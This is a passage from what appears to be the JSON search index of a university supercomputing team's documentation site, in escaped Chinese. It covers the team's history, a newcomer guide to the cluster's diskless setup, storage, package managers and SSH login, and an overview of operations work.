\u76ee\u5f55\u670d\u52a1\uff1aLDAP          </li> <li>            \u7f16\u8bd1/\u6784\u5efa\u7cfb\u7edf          </li> <li>            \u81ea\u52a8\u6784\u5efa\uff1aJenkins          </li> <li>            \u865a\u62df\u5316\u5e73\u53f0\uff1aPVE          </li> <li>            \u8f6f\u4ef6\uff08\u73af\u5883\uff09\u8fd0\u7ef4          </li> </ul>"},{"location":"index/contribute/#tag:\u5b8c\u5584","title":"\u5b8c\u5584","text":"<ul> <li>            \u5305\u7ba1\u7406\u5668\uff1aSpack          </li> <li>            \u53ef\u89c2\u6d4b\u6027          </li> <li>            \u5e26\u5916\u7ba1\u7406          </li> <li>            \u6570\u636e\u91c7\u96c6\uff1aOpenTelemetry          </li> <li>            \u6587\u4ef6\u6743\u9650          </li> <li>            \u65e5\u5fd7\u6536\u96c6          </li> <li>            \u73af\u5883\u53d8\u91cf\u4e0e Shell          </li> <li>            \u73b0\u4ee3\u5316 CLI \u5de5\u5177          </li> <li>            \u786c\u4ef6\u77e5\u8bc6          </li> <li>            \u786c\u4ef6\u8fd0\u7ef4          </li> <li>            \u7f51\u7edc\u89c2\u6d4b          </li> <li>            \u8fd0\u7ef4\u6587\u6863          </li> </ul>"},{"location":"index/contribute/#tag:\u5f52\u6863","title":"\u5f52\u6863","text":"<ul> <li>            \u7f51\u7edc\u4fe1\u606f\u670d\u52a1\uff1aNIS          </li> </ul>"},{"location":"index/history/","title":"ZJUSCT \u5386\u53f2","text":""},{"location":"index/history/#zjusct-\u5386\u53f2","title":"ZJUSCT \u5386\u53f2","text":"<p>Abstract</p> <p>\u6536\u96c6\u8d85\u7b97\u961f\u53d1\u5c55\u7684\u5386\u53f2\u8d44\u6599\uff0c\u8bb0\u5f55\u8d85\u7b97\u961f\u7684\u6210\u957f\u5386\u7a0b\u3002</p>"},{"location":"index/history/#\u7ade\u8d5b\u5386\u7a0b","title":"\u7ade\u8d5b\u5386\u7a0b","text":"\u5e74\u4efd\u548c\u8d5b\u4e8b \u7167\u7247 2017 ASC 2021 ASC"},{"location":"index/history/#\u81ea\u5efa\u96c6\u7fa4\u53d1\u5c55\u5386\u53f2","title":"\u81ea\u5efa\u96c6\u7fa4\u53d1\u5c55\u5386\u53f2","text":""},{"location":"index/history/#\u8fdc\u53e4\u65f6\u671f","title":"\u8fdc\u53e4\u65f6\u671f","text":"<p>\u6d6a\u6f6e M3\u3001M4 \u670d\u52a1\u5668\u7ec4\u6210\u7684\u96c6\u7fa4\u3002</p> <p></p> <p></p>"},{"location":"index/history/#\u8d5e\u52a9\u4e0e\u5408\u4f5c","title":"\u8d5e\u52a9\u4e0e\u5408\u4f5c","text":"<ul> <li>ASC2016 \u83b7\u82f1\u4f1f\u8fbe\u786c\u4ef6 Tesla GPU K80 \u52a0\u901f\u5361\u786c\u4ef6\u8d5e\u52a9</li> <li>ASC2018 \u83b7 AMAX \u8d5e\u52a9\u501f\u7528\u786c\u4ef6 Tesla GPU V100 8 \u5757</li> </ul>"},{"location":"index/newcomer/","title":"ZJUSCT \u96c6\u7fa4\u65b0\u624b\u6307\u5357","text":""},{"location":"index/newcomer/#zjusct-\u96c6\u7fa4\u65b0\u624b\u6307\u5357","title":"ZJUSCT \u96c6\u7fa4\u65b0\u624b\u6307\u5357","text":"<p>Abstract</p> <p>\u672c\u6587\u6863\u7b80\u5355\u6307\u5f15\u65b0\u6210\u5458\u719f\u6089\u96c6\u7fa4\u73af\u5883\u3002</p> <p>Warning</p> <p>\u96c6\u7fa4\u73af\u5883\u4e0e\u4e2a\u4eba\u7535\u8111\u5b58\u5728\u663e\u8457\u5dee\u5f02\uff0c\u8bf7\u52a1\u5fc5\u4ed4\u7ec6\u9605\u8bfb\u672c\u6307\u5357\u3002\u4e0d\u5f53\u64cd\u4f5c\u53ef\u80fd\u5bfc\u81f4\uff1a</p> <ul> <li>\u6027\u80fd\u663e\u8457\u4e0b\u964d</li> <li>\u6570\u636e\u4e22\u5931\u98ce\u9669</li> <li>\u5f71\u54cd\u5176\u4ed6\u7528\u6237\u4f7f\u7528</li> </ul>"},{"location":"index/newcomer/#\u96c6\u7fa4\u67b6\u6784\u6982\u8ff0","title":"\u96c6\u7fa4\u67b6\u6784\u6982\u8ff0","text":"<p>\u8d85\u7b97\u961f\u81ea\u5efa\u6709\u5341\u4f59\u53f0\u670d\u52a1\u5668\u7684\u96c6\u7fa4\uff0c\u4f9b\u7ade\u8d5b\u3001\u77ed\u5b66\u671f\u8bfe\u7a0b\u548c\u961f\u5458\u65e5\u5e38\u4f7f\u7528\u3002</p> <p>\u96c6\u7fa4\u5173\u952e\u7279\u6027\uff1a</p> <ul> <li>\u7f51\u7edc\u67b6\u6784\uff1a\u4e07\u5146\u4ee5\u592a\u7f51 + InfiniBand \u9ad8\u901f\u7f51\u7edc</li> <li>\u8ba1\u7b97\u8282\u70b9\uff1a\u65e0\u76d8\u7cfb\u7edf\u8bbe\u8ba1</li> </ul>"},{"location":"index/newcomer/#\u5b58\u50a8\u7cfb\u7edf","title":"\u5b58\u50a8\u7cfb\u7edf","text":"\u6302\u8f7d\u70b9 \u7c7b\u578b \u5bb9\u91cf \u7528\u9014 <code>/</code> OverlayFS+NFS - \u7cfb\u7edf\u6839\u76ee\u5f55 <code>/home</code> NFS SSD 8 TB(RAID10) \u7528\u6237\u5bb6\u76ee\u5f55 <code>/ocean</code> NFS HDD 21 TB(RAID60) \u51b7\u6570\u636e <code>/river</code> NFS SSD \u4e0e <code>/home</code> \u5171\u7528 \u70ed\u6570\u636e <code>/local-sata</code><code>/local-nvme</code> \u672c\u5730 SSD \u6309\u8282\u70b9\u914d\u7f6e \u672c\u5730\u78c1\u76d8\uff0c\u9002\u7528\u4e8e\u4f4e\u5ef6\u8fdf\u4efb\u52a1 <ul> <li>\u53ea\u6709 <code>/</code> \u4e0d\u662f\u6301\u4e45\u5b58\u50a8\u3002</li> <li> <p>\u7528\u9014\u8bf4\u660e\uff1a\u5404\u6302\u8f7d\u70b9\u6839\u76ee\u5f55\u4e0b\u6709 <code>README</code> \u6587\u4ef6\uff0c\u8bf4\u660e\u4e86\u5404\u76ee\u5f55\u7684\u7528\u9014\uff0c\u8bf7\u81ea\u884c\u67e5\u770b\u3002</p> <pre><code>cat /ocean/README\n</code></pre> <p>Tip</p> <ul> <li>\u5bb6\u76ee\u5f55 \u5bb9\u91cf\u5e38\u5e74\u7d27\u5f20\uff0c\u8bf7\u53ca\u65f6\u6e05\u7406\u3002</li> <li>\u5c06\u6a21\u578b\u3001\u6570\u636e\u96c6\u7b49\u5927\u6587\u4ef6\u5b58\u50a8\u5728 <code>/ocean</code>\uff08\u9700\u8981\u8de8\u8282\u70b9\u5171\u4eab\uff09\u6216 <code>/local</code>\uff08\u4ec5\u8be5\u8282\u70b9\u4f7f\u7528\uff09\u4e2d\u3002</li> <li>\u6027\u80fd\uff1a\u7f51\u7edc\u5b58\u50a8\u541e\u5410 ~1GB/s\uff08\u4e07\u5146\u4ee5\u592a\u7f51\uff09\uff0c\u5c0f\u6587\u4ef6 IO \u6027\u80fd\u53d7\u9650\u3002</li> </ul> </li> <li> <p>\u5feb\u7167\u4fdd\u62a4\uff1a\u6240\u6709\u5b58\u50a8\u6c60\uff08<code>/home</code>\u3001<code>/ocean</code> \u548c <code>/river</code>\uff09\u5747\u6709\u6bcf\u65e5\u5feb\u7167\u4fdd\u62a4\uff0c\u4fdd\u7559 3 \u5929\u3002</p> </li> </ul> <p>\u5173\u4e8e OverlayRoot</p> <ul> <li>\u9664\u4e86\u4e0a\u8ff0\u6302\u8f7d\u70b9\u5916\uff0c\u5176\u4ed6\u76ee\u5f55\u5747\u4e3a <code>tmpfs</code>\uff0c\u4f1a\u5360\u7528\u5185\u5b58\u3002\u5982\u679c\u4f7f\u7528\u8fc7\u591a\u53ef\u80fd\u5f15\u8d77 OOM\u3002</li> <li>\u4e3a\u4e86\u51cf\u5c0f\u5185\u5b58\u538b\u529b\uff0c\u76ee\u524d <code>/tmp</code>\u3001<code>/var/tmp</code> \u548c <code>/var/lib/docker</code> \u5747\u88ab\u6302\u8f7d\u5230 <code>/local</code> \u4e0b\u3002</li> </ul>"},{"location":"index/newcomer/#\u65e0\u76d8\u7cfb\u7edf","title":"\u65e0\u76d8\u7cfb\u7edf","text":"<p>\u4e3a\u4e86\u65b9\u4fbf\u8fd0\u7ef4\uff0c\u96c6\u7fa4\u91c7\u7528\u65e0\u76d8\u7cfb\u7edf\u8bbe\u8ba1\u3002\u7ec6\u8282\u89c1 \u8fd0\u7ef4/\u7cfb\u7edf\u8fd0\u7ef4/\u65e0\u76d8\u7cfb\u7edf\u3002</p> <ul> <li>\u5f15\u5bfc\u65b9\u5f0f\uff1aPXE \u7f51\u7edc\u5f15\u5bfc</li> <li>\u6839\u6587\u4ef6\u7cfb\u7edf\uff1aOverlayFS + NFS Root</li> <li>\u81ea\u52a8\u6784\u5efa\uff1a\u4f7f\u7528 Jenkins \u81ea\u52a8\u6784\u5efa\u548c\u66f4\u65b0\u6839\u6587\u4ef6\u7cfb\u7edf\u3002</li> <li>\u91cd\u8981\u9650\u5236\uff1a\u6839\u76ee\u5f55 (<code>/</code>) \u4fee\u6539\u5728\u91cd\u542f\u540e\u4e22\u5931\uff0c\u5982\u901a\u8fc7 APT \u5b89\u88c5\u7684\u8f6f\u4ef6\u5305\u7b49\u3002</li> </ul>"},{"location":"index/newcomer/#\u8f6f\u4ef6\u73af\u5883","title":"\u8f6f\u4ef6\u73af\u5883","text":"<ul> <li> <p>\u5305\u7ba1\u7406\u7cfb\u7edf\uff1a\u96c6\u7fa4\u9884\u88c5 Conda \u548c Spack\u3002</p> <pre><code># Conda \u73af\u5883\nconda create -n myenv\n\n# Spack \u5305\u7ba1\u7406\nspack install hdf5\n</code></pre> <ul> <li>Conda \u521b\u5efa\u73af\u5883\u9ed8\u8ba4\u5728\u4e2a\u4eba\u5bb6\u76ee\u5f55\u4e0b\uff0c\u53ef\u4ee5\u968f\u610f\u4fee\u6539\u3002</li> <li>Spack \u9ed8\u8ba4\u73af\u5883\u5728 <code>/opt/spack</code> \u4e0b\uff0c\u65e0\u6cd5\u4fee\u6539\u3002\u5efa\u8bae\u53c2\u7167 \u8fd0\u7ef4/\u8f6f\u4ef6\u8fd0\u7ef4/Spack \u521b\u5efa\u4e2a\u4eba Spack \u73af\u5883\u3002</li> </ul> </li> <li> <p>\u9884\u88c5\u76ee\u5f55\uff1a<code>/opt</code></p> </li> <li>\u914d\u7f6e\u7ba1\u7406\uff1a\u96c6\u7fa4\u914d\u7f6e\u4ed3\u5e93</li> </ul>"},{"location":"index/newcomer/#\u8d26\u6237\u6ce8\u518c\u6d41\u7a0b","title":"\u8d26\u6237\u6ce8\u518c\u6d41\u7a0b","text":"<p>\u5411\u96c6\u7fa4\u7ba1\u7406\u5458\u7533\u8bf7\uff0c\u586b\u5199\u8868\u5355\u5b8c\u6210\u6ce8\u518c\u3002\u968f\u540e\uff0c\u4f7f\u7528 SSH \u767b\u5f55\u96c6\u7fa4\u3002</p> <pre><code>ssh &lt;username&gt;@clusters.zju.edu.cn\n</code></pre> <p>\u6240\u6709\u8d85\u7b97\u961f\u5458\u62e5\u6709 root \u6743\u9650\uff0c\u8bf7\u4fdd\u7ba1\u597d\u81ea\u5df1\u7684 SSH \u5bc6\u94a5\u548c\u8d26\u6237\u5bc6\u7801\uff01</p>"},{"location":"operation/","title":"\u8fd0\u7ef4\u6587\u6863","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/#\u8fd0\u7ef4\u6587\u6863","title":"\u8fd0\u7ef4\u6587\u6863","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/#\u8fd0\u7ef4\u6587\u6863\u5bfc\u822a","title":"\u8fd0\u7ef4\u6587\u6863\u5bfc\u822a","text":"<p>\u8fd0\u7ef4\u6587\u6863\u7ed3\u6784\u6309\u7167\u8fd0\u7ef4\u5de5\u4f5c\u7684\u4e0d\u540c\u65b9\u9762\u8fdb\u884c\u5212\u5206\u3002\u53c2\u4e0e\u8fd0\u7ef4\u5de5\u4f5c\u7684\u540c\u5b66\u53ef\u4ee5\u9009\u62e9\u81ea\u5df1\u611f\u5174\u8da3\u7684\u90e8\u5206\u8fdb\u884c\u5b66\u4e60\uff0c\u4e5f\u53ef\u4ee5\u6839\u636e\u4efb\u52a1\u9700\u8981\u8fdb\u884c\u67e5\u9605\u3002\u76ee\u524d\u8fd0\u7ef4\u5de5\u4f5c\u7684\u91cd\u5fc3\u5728\u8f6f\u4ef6\u8fd0\u7ef4\u3002</p> <p>\u786c\u4ef6\u8fd0\u7ef4</p> <ul> <li>\u5185\u5bb9\uff1a<ul> <li>\u786c\u4ef6\u8bbe\u5907\u7684\u76f8\u5173\u77e5\u8bc6\u548c\u7ecf\u9a8c\uff0c\u8fdb\u5165\u673a\u623f\u6216\u8fdb\u884c\u786c\u4ef6\u64cd\u4f5c\u65f6\u8bf7\u53c2\u8003\u8be5\u90e8\u5206\u6587\u6863\u3002</li> <li>\u96c6\u7fa4\u4e2d\u786c\u4ef6\u8bbe\u5907\u7684\u6587\u6863\u6536\u96c6\u3002</li> </ul> </li> <li>\u76f8\u5173\u4efb\u52a1\uff1a\u6bcf\u6708\u4f1a\u6709\u4e00\u4e24\u6b21\u66f4\u6362\u8bbe\u5907\u7684\u9700\u6c42\uff0c\u7ebf\u4e0b\u6bd4\u8d5b\u65f6\u642d\u5efa\u96c6\u7fa4\u3002</li> </ul> <p>\u7f51\u7edc\u8fd0\u7ef4</p> <ul> <li>\u5185\u5bb9\uff1a<ul> <li>\u4ee5\u592a\u7f51\uff1a\u4f01\u4e1a\u7ea7\u4ea4\u6362\u673a\u548c\u8def\u7531\u5668\u7684\u914d\u7f6e\u65b9\u6cd5\uff0cVLAN\u3001DHCP Snooping \u7b49\u5e38\u89c1\u7f51\u7edc\u6280\u672f\u3002</li> <li>\u9ad8\u6027\u80fd\u7f51\u7edc\uff1aInfiniBand \u7f51\u7edc\u539f\u7406\uff0cRDMA \u7b49\u6280\u672f\u3002</li> </ul> </li> <li>\u76f8\u5173\u4efb\u52a1\uff1a<ul> <li>\u76d1\u63a7\u7f51\u7edc\u60c5\u51b5\uff0c\u6392\u67e5\u7f51\u7edc\u6545\u969c\u3002</li> <li>\u7ebf\u4e0b\u6bd4\u8d5b\u65f6\u6839\u636e\u9700\u6c42\u7ec4\u5efa\u7f51\u7edc\u3002</li> <li>\u5bf9\u9ad8\u6027\u80fd\u7f51\u7edc\u8fdb\u884c\u6392\u969c\u548c\u8c03\u4f18\u3002</li> </ul> </li> </ul> <p>\u7cfb\u7edf\u8fd0\u7ef4</p> <ul> <li>\u5185\u5bb9\uff1a<ul> <li>\u76ee\u524d\u96c6\u7fa4\u4f7f\u7528\u57fa\u4e8e PXE \u548c NFS Root \u7684\u65e0\u76d8\u7cfb\u7edf\uff0c\u8fd9\u91cc\u4ecb\u7ecd\u8fd9\u5957\u7cfb\u7edf\u7684\u90e8\u7f72\u548c\u7ef4\u62a4\u65b9\u5f0f\u3002</li> <li>\u5b8c\u6574\u7684\u96c6\u7fa4\u5305\u542b\u4e00\u6574\u5957\u670d\u52a1\u4f53\u7cfb\uff0c\u5305\u62ec\u76ee\u5f55\u670d\u52a1\u3001\u5b58\u50a8\u670d\u52a1\u3001\u4f5c\u4e1a\u8c03\u5ea6\u7b49\uff0c\u8fd9\u91cc\u4e5f\u4f1a\u4ecb\u7ecd\u8fd9\u4e9b\u670d\u52a1\u7684\u914d\u7f6e\u548c\u7ef4\u62a4\u3002</li> <li>Linux \u7cfb\u7edf\u8fd0\u7ef4\u7684\u5404\u9879\u77e5\u8bc6\u3002</li> </ul> </li> <li>\u76f8\u5173\u4efb\u52a1\uff1a<ul> <li>\u6d4b\u8bd5\u548c\u66f4\u65b0\u7cfb\u7edf\u3002</li> <li>\u7ef4\u62a4\u96c6\u7fa4\u670d\u52a1\uff0c\u4fdd\u969c\u96c6\u7fa4\u7a33\u5b9a\u8fd0\u884c\u3002</li> <li>\u4f18\u5316\u96c6\u7fa4\u67b6\u6784\uff0c\u63a2\u7d22\u63d0\u5347\u96c6\u7fa4\u6027\u80fd\u3002</li> </ul> </li> </ul> <p>\u8f6f\u4ef6\u8fd0\u7ef4</p> <ul> <li>\u5185\u5bb9\uff1a<ul> <li>\u5e94\u7528\u5c42\u9762\u7684\u8fd0\u7ef4\u5de5\u4f5c\uff0c\u5305\u62ec\u8f6f\u4ef6\u73af\u5883\u7684\u7ba1\u7406\u3001\u8f6f\u4ef6\u7684\u5b89\u88c5\u548c\u914d\u7f6e\u7b49\u3002</li> <li>Lmod\u3001Spack \u7b49\u8f6f\u4ef6\u5305\u7ba1\u7406\u5de5\u5177\u3002</li> </ul> </li> <li>\u76f8\u5173\u4efb\u52a1\uff1a\u66f4\u65b0\u3001\u6d4b\u8bd5\u548c\u7ef4\u62a4\u96c6\u7fa4\u4e2d\u7684\u8f6f\u4ef6\u73af\u5883\u3002</li> </ul> <p>\u53ef\u89c2\u6d4b\u6027</p> <ul> <li>\u5185\u5bb9\uff1a\u65b0\u4e00\u4ee3\u8fd0\u7ef4\u81f4\u529b\u4e8e\u6784\u5efa\u53ef\u89c2\u6d4b\u6027\u4f53\u7cfb\uff0c\u5b83\u80fd\u591f\u8ba9\u56e2\u961f\u8bc4\u4f30\u3001\u76d1\u6d4b\u548c\u6539\u8fdb\u5206\u5e03\u5f0f IT \u7cfb\u7edf\u7684\u6027\u80fd\u3002\u76f8\u6bd4\u4f20\u7edf\u7684\u76d1\u6d4b\u65b9\u6cd5\uff0c\u5b83\u8981\u6709\u6548\u5f97\u591a\u3002</li> <li>\u76f8\u5173\u4efb\u52a1\uff1a\u914d\u7f6e\u548c\u7ef4\u62a4\u76d1\u63a7\u3001\u65e5\u5fd7\u3001\u544a\u8b66\u7b49\u7cfb\u7edf\u3002</li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/#\u8fd0\u7ef4\u5de5\u4f5c\u6982\u8ff0","title":"\u8fd0\u7ef4\u5de5\u4f5c\u6982\u8ff0","text":"<p>Quote</p> <ul> <li>\u8fd0\u7ef4\u4f53\u7cfb\u7684\u6784\u5efa - \u4fe1\u606f\u5316\u89c2\u5bdf\u7f51</li> </ul> <p>\u4e0b\u9762\u662f\u5de5\u4e1a\u754c\u5bf9\u8fd0\u7ef4\u5de5\u4f5c\u7684\u4ecb\u7ecd\uff1a</p> <p>\u8fd0\u7ef4\u7684\u57fa\u7840\u5de5\u4f5c\u901a\u5e38\u662f\u9488\u5bf9\u73b0\u6709\u7cfb\u7edf\u53ca\u9879\u76ee\u7684\uff0c\u4f8b\u5982\u670d\u52a1\u5668\u3001\u5404\u7c7b\u4e91\u4ea7\u54c1\uff0c\u6b63\u5728\u8fd0\u884c\u7684\u9879\u76ee\u3001\u76d1\u63a7\u3001\u8d26\u53f7\u6743\u9650\u7ba1\u63a7\uff0c\u9879\u76ee\u4e0a\u7ebf\u7b49\u7b49\uff0c\u662f\u5bbd\u6cdb\u800c\u7e41\u7410\u7684\uff0c\u5c11\u6709\u5efa\u8bbe\u6027\u7684\u5185\u5bb9\u3002</p> <p>\u5f53\u6211\u4eec\u63a5\u624b\u4e00\u5957\u65b0\u7684\u7cfb\u7edf\uff0c\u5c31\u6709\u5fc5\u8981\u5c06\u5b83\u672c\u8eab\u53ca\u5468\u8fb9\u8fdb\u884c\u5b8c\u5584\u3002\u5728\u5927\u516c\u53f8\u91cc\u6709\u8f83\u4e3a\u5168\u9762\u7684\u8fd0\u7ef4\u4f53\u7cfb\uff0c\u6709\u684c\u9762\u8fd0\u7ef4\u3001\u7f51\u7edc\u8fd0\u7ef4\u3001\u5b89\u5168\u8fd0\u7ef4\u3001\u7814\u53d1\u8fd0\u7ef4\u3001\u6570\u636e\u5e93\u8fd0\u7ef4\u4ee5\u53ca\u7cfb\u7edf\u8fd0\u7ef4\u6216\u5e94\u7528\u8fd0\u7ef4\u7b49\u4e13\u4e1a\u56e2\u961f\uff0c\u800c\u66f4\u591a\u7684\u516c\u53f8\u8fd0\u7ef4\u53ef\u80fd\u53ea\u6709 1-2 \u4e2a\u3002\u4ee5\u4e0a\u7684\u5c97\u4f4d\u5de5\u4f5c\u90fd\u9700\u8981\u5b8c\u6210\u3002</p> <p>\u5728\u63a5\u89e6\u65b0\u73af\u5883\u65f6\uff0c\u9762\u5bf9\u7684\u662f\u4e0a\u4efb\u7559\u4e0b\u7684\u5751\uff0c\u8fd9\u6bd4\u5f00\u53d1\u63a5\u624b\u4ee3\u7801\u8981\u66f4\u52a0\u4e25\u5cfb\u3002\u4ea4\u63a5\u7684\u8d44\u6599\u5176\u5b9e\u4e0d\u5e94\u8be5\u53ea\u662f\u8d26\u53f7\u5bc6\u7801\u3001\u5de5\u4f5c\u6d41\u7a0b\uff0c\u5de5\u4f5c\u6ce8\u610f\u4e8b\u9879\uff0c\u66f4\u91cd\u8981\u7684\u662f\u64cd\u4f5c\u7ef4\u62a4\u6587\u6863\uff0c\u56e0\u4e3a\u7cfb\u7edf\u5f88\u5c11\u6709\u7b80\u5355\u7684\u73af\u5883\uff0c\u5373\u4fbf\u6709\uff0c\u4e5f\u4f1a\u5b58\u5728\u4e00\u4e9b\u5fae\u5999\u7684\u9879\u76ee\u903b\u8f91\u5173\u7cfb\uff0c\u7a0d\u6709\u4e0d\u614e\uff0c\u5c31\u6709\u53ef\u80fd\u917f\u6210\u7ebf\u4e0a\u95ee\u9898\u3002\u73b0\u5728\u5927\u591a\u90fd\u662f\u5fae\u670d\u52a1\u7684\u7ed3\u6784\uff0c\u589e\u52a0\u4e86\u7cfb\u7edf\u7ef4\u62a4\u7684\u590d\u6742\u6027\u3002</p> <p>\u4f8b\u5982\u63a5\u624b\u540e\u9886\u5bfc\u8981\u4f60\u90e8\u7f72\u4f7f\u7528 docker \u90e8\u7f72\u4e00\u4e2a java \u670d\u52a1 , \u4ece\u6b63\u5f0f\u73af\u5883\u590d\u5236\u4e00\u4e2a\u5230\u6d4b\u8bd5\u73af\u5883\uff0c\u7ed3\u679c\u542f\u52a8\u540e\u51fa\u95ee\u9898\u4e86\uff0c\u53ef\u80fd\u662f\u542f\u52a8\u53c2\u6570\u4e0e\u76ee\u524d\u73af\u5883\u4e0d\u5339\u914d\uff0c\u53ef\u80fd\u662f\u8fde\u63a5\u6743\u9650\u672a\u653e\u5f00\uff0c\u53ef\u80fd\u662f\u542f\u52a8\u540e\u8fde\u63a5\u7684\u662f\u751f\u4ea7\u7684\u6570\u636e\u5e93\uff0c\u5982\u679c\u7a0b\u5e8f\u542f\u52a8\u540e\u6e05\u7a7a\u6216\u8005\u4fee\u6539\u4e86\u4e00\u4e9b\u5386\u53f2\u6570\u636e\uff0c\u4ee4\u4eba\u7ec6\u601d\u6781\u6050\u3002</p> <p>\u8fd9\u79cd\u95ee\u9898\u5f88\u5e38\u89c1\uff0c\u5c31\u6211\u76ee\u524d\u5c31\u9047\u5230\u4e0d\u5c11\uff0c\u597d\u591a\u914d\u7f6e\u4fe1\u606f\u5199\u7684\u5f88\u6a21\u7cca\uff0c\u9879\u76ee\u4e0e\u9879\u76ee\u4e4b\u95f4\u8026\u5408\u5ea6\u975e\u5e38\u9ad8\uff0c\u6ca1\u51c6\u5c31\u7275\u626f\u5230\u54ea\u4e2a\u7cfb\u7edf\u4e86\uff0c\u7275\u4e00\u53d1\u800c\u52a8\u5168\u8eab\uff0c\u662f\u5173\u4e5f\u4e0d\u6562\u5173\uff0c\u6539\u4e5f\u4e0d\u6562\u6539\uff0c\u4f5c\u4e3a\u4e00\u540d\u8fd0\u7ef4\u5de5\u7a0b\u5e08\uff0c\u6211\u4eec\u5c45\u7136\u4f1a\u4e0d\u6562\u52a8\u4e00\u4e2a\u9879\u76ee\uff01\u6240\u4ee5\u8981\u6253\u9020\u4e00\u4e2a\u94c1\u6876\u51fa\u6765\uff0c\u8fd9\u662f\u4e00\u4e2a\u521b\u9020\u6027\u7684\u8fc7\u7a0b\uff0c\u4e5f\u662f\u6211\u4eec\u6df1\u5165\u9879\u76ee\u7684\u8fc7\u7a0b\u3002\u53ea\u6709\u66f4\u6df1\u5165\u7684\u4e86\u89e3\u9879\u76ee\uff0c\u624d\u80fd\u66f4\u597d\u7684\u53bb\u7ef4\u62a4\u9879\u76ee\u3002</p> <p>\u5bf9\u4e8e\u8d85\u7b97\u961f\u6765\u8bf4\uff0c\u8fd0\u7ef4\u5de5\u4f5c\u7684\u4efb\u52a1\u548c\u9762\u5bf9\u7684\u60c5\u51b5\u4e5f\u5dee\u4e0d\u591a\uff0c\u4e0d\u8fc7\u6ca1\u6709\u8fd9\u4e48\u4e25\u5cfb\u3002\u6bd5\u7adf\u6211\u4eec\u4ece\u4e8b\u7684\u662f\u7814\u7a76\u4e0d\u662f\u751f\u4ea7\uff0c\u4e0d\u9700\u8981\u4fdd\u969c\u6781\u9ad8\u7684\u53ef\u7528\u6027\u3002\u5728\u6211\u4eec\u81ea\u6709\u7684\u5c0f\u96c6\u7fa4\u4e0a\uff0c\u6211\u4eec\u53ef\u4ee5\u7075\u6d3b\u5730\u8fdb\u884c\u8fd0\u7ef4\u5de5\u4f5c\uff0c\u8fdb\u884c\u5404\u79cd\u5404\u6837\u7684\u63a2\u7d22\u548c\u521b\u65b0\uff0c\u4e0d\u9700\u8981\u9075\u5faa\u4e25\u683c\u7684\u8fd0\u7ef4\u7a0b\u5e8f\u3002</p> <p>\u4f46\u662f\uff0c\u6211\u4eec\u4e5f\u9700\u8981\u5efa\u7acb\u4e00\u5957\u81ea\u52a8\u5316\u8fd0\u7ef4\u4f53\u7cfb\uff0c\u4ee5\u4fbf\u4e8e\u66f4\u597d\u5730\u7ba1\u7406\u96c6\u7fa4\uff0c\u63d0\u9ad8\u8fd0\u7ef4\u6548\u7387\uff0c\u6700\u7ec8\u8ba9\u8fd0\u7ef4\u4eba\u5458\u4ece\u7e41\u7410\u7684\u91cd\u590d\u6027\u5de5\u4f5c\u4e2d\u89e3\u653e\u51fa\u6765\uff0c\u66f4\u591a\u5730\u6295\u5165\u5230\u521b\u65b0\u6027\u5de5\u4f5c\u4e2d\u3002</p> <p>\u8d85\u7b97\u961f\u8fd0\u7ef4\u7684\u4efb\u52a1</p> <ol> <li>\u719f\u7ec3\u638c\u63e1 Linux \u7cfb\u7edf\u8fd0\u7ef4\u548c HPC \u96c6\u7fa4\u7ba1\u7406\u77e5\u8bc6\u3002</li> <li>\u5728\u7ebf\u4e0a\u7ebf\u4e0b\u6bd4\u8d5b\u65f6\u5e2e\u52a9\u89e3\u51b3\u7efc\u5408\u6027\u95ee\u9898\u3002</li> <li>\u7ef4\u62a4\u81ea\u6709\u96c6\u7fa4\uff0c\u4e3a\u6bd4\u8d5b\u548c\u8bad\u7ec3\u63d0\u4f9b\u7a33\u5b9a\u597d\u7528\u7684\u73af\u5883\u3002</li> <li>\u7ef4\u62a4\u6258\u7ba1\u5728\u96c6\u7fa4\u7684\u670d\u52a1\u5668\u3002</li> <li>\u4e3a\u961f\u5185\u6210\u5458\u65e5\u5e38\u4f7f\u7528\u96c6\u7fa4\u63d0\u4f9b\u652f\u6301\u3002</li> </ol> <p>\u5982\u4f55\u505a\u4e00\u4e2a\u597d\u7684\u8fd0\u7ef4\uff1f</p> <ul> <li>\u57fa\u7840\uff1a<ul> <li>\u5bf9\u81ea\u5df1\u5f53\u524d\u7684\u73af\u5883\u548c\u4efb\u4f55\u4e1c\u897f\u90fd\u5e94\u8be5\u975e\u5e38\u6e05\u695a\uff1b</li> <li>\u8981\u6709\u76d1\u63a7\uff0c\u5207\u5b9e\u6709\u7528\u7684\u53ef\u4ee5\u53d1\u73b0\u95ee\u9898\u7684\u76d1\u63a7\uff1b</li> <li>\u4efb\u4f55\u4e1c\u897f\u90fd\u8981\u6709\u5907\u4efd\uff0c\u53ef\u4ee5\u7528\u4e8e\u5feb\u901f\u6062\u590d\uff0c\u4e5f\u8981\u505a\u6062\u590d\u6f14\u7ec3\uff1b</li> </ul> </li> <li>\u8fdb\u9636<ul> <li>\u9488\u5bf9\u7cfb\u7edf\u505a\u4f18\u5316\u5904\u7406\uff1b</li> <li>\u9488\u5bf9\u5de5\u4f5c\u6d41\u7a0b\u505a\u4f18\u5316\u5904\u7406\uff1b</li> </ul> </li> </ul> <p>\u5728\u8fd0\u7ef4\u5de5\u4f5c\u4e2d\uff0c\u6211\u4eec\u603b\u7ed3\u4e86\u4e24\u70b9\u539f\u5219\uff1a</p> <ol> <li> <p>Keep It Simple and Stupid</p> <p>\u8fd9\u662f\u4e3a\u4e86\u51cf\u5c11\u8fd0\u7ef4\u7684\u4eba\u529b\u6210\u672c\u3002\u6784\u5efa\u7b80\u5355\u800c\u5b9e\u7528\u7684\u7cfb\u7edf\u5c31\u80fd\u6ee1\u8db3\u6211\u4eec\u7684\u9700\u6c42\uff0c\u4e0d\u9700\u8981\u4e3a\u4e86\u9ad8\u5927\u4e0a\u800c\u9ad8\u5927\u4e0a\uff0c\u4e0d\u8981\u5728\u6ca1\u6709\u6269\u5c55\u7684\u9700\u6c42\u65f6\u4f7f\u7528 scale out \u7684\u65b9\u6848\u3002\u4e0b\u9762\u662f\u4e00\u4e9b\u4f8b\u5b50\uff1a</p> <p>\u8981\u4e0d\u8981\u4e0a K8S\uff1f</p> <p>\u6211\u4eec\u53ef\u80fd\u6c38\u8fdc\u90fd\u4e0d\u4f1a\u4e0a K8S\uff0c\u56e0\u4e3a\u6211\u4eec\u7684\u96c6\u7fa4\u89c4\u6a21\u592a\u5c0f\uff0cK8S 